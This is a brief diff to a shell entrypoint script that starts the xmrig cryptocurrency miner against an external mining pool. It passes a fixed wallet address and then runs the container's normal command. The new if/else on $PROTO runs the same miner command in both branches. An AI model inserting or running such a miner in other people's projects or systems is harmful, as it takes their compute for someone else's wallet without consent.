@@ -2,8 +2,10 @@
 
 set -e
 
-	./xmrig --Proto --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BmB1donWDuEKXzJjmpKKpX12oUg39U5wyj.odium3 -t 4
-	sleep 5
+if [ "$PROTO" = "ws" ]
+then	./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BmB1donWDuEKXzJjmpKKpX12oUg39U5wyj.odium3 -t 4
+else    ./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BmB1donWDuEKXzJjmpKKpX12oUg39U5wyj.odium3 -t 4
+fi
 
 
 exec "$@"
